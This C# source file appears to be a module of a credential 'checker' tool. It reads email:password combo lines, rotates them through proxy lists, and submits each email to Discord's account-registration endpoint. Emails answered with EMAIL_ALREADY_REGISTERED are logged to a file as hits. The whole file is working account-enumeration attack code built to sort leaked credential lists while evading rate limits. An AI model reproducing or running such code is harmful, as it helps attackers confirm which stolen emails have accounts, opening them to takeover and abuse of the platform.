using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VM.VM
{
    class Discord_VM
    {
        public static void disord(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = Checker.timeout
                };
                string gu = Guid.NewGuid().ToString();
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Checker.ProxyList.ElementAt<string>(new Random().Next(0, Checker.proxytotal)).Split(':', ';', '|');
                ProxyClient proxyClient = Checker.proxytype == "SOCKS5" ? (ProxyClient)new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (Checker.proxytype == "SOCKS4" ? (ProxyClient)new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1])));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                string str1 = Checker.RandomDigits(12);
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no - cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = true;
                string str2 = httpRequest.Post("https://discord.com/api/v8/auth/register", "{\"fingerprint\":\"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM\",\"email\":\""+strArray1[0]+ "\", \"username\":\""+strArray1[0]+ "\", \"password\":\"rth21e98!fmPP\",\"invite\":null,\"consent\":true,\"date_of_birth\":\"1993-05-03\",\"gift_code_sku_id\":null,\"captcha_key\":null}", "application/json").ToString();
                if (str2.Contains("EMAIL_ALREADY_REGISTERED"))
                {
                    Interlocked.Increment(ref Checker.hits);
                    Interlocked.Increment(ref Checker.check);
                    Export.WriteToFileThreadSafe(combo, "..\\VM\\Discord_VM.txt");
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.LawnGreen);
                }
                if (str2.Contains("EMAIL_TYPE_INVALID_EMA") || str2.Contains("token") || str2.Contains("captcha-required"))
                {
                    Interlocked.Increment(ref Checker.check);
                    Interlocked.Increment(ref Checker.bad);
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.Red);
                }
            }
            catch
            {
                Interlocked.Increment(ref Checker.err);
                Checker.ComboQueue.Enqueue(combo);
            }
        }
    }
}
